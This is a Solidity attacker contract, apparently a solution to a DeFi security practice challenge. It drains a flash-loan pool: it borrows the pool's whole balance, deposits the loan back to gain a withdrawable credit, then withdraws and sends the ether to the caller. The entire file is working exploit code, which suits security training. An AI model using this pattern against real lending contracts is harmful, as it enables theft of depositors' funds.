// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "./SideEntranceLenderPool.sol";

import "hardhat/console.sol";

contract SideEntranceAttacker {

    using Address for address;

    SideEntranceLenderPool pool;

    uint256 poolBalance;

    constructor(address ca) {
        pool = SideEntranceLenderPool(ca);
    }

    function exploit() external {
        poolBalance = address(pool).balance;

        pool.flashLoan(poolBalance);

        pool.withdraw();

        payable(msg.sender).transfer(address(this).balance);
    }

    function execute() external payable {
        pool.deposit{ value: poolBalance }();
    }

    receive() external payable {
    }
}
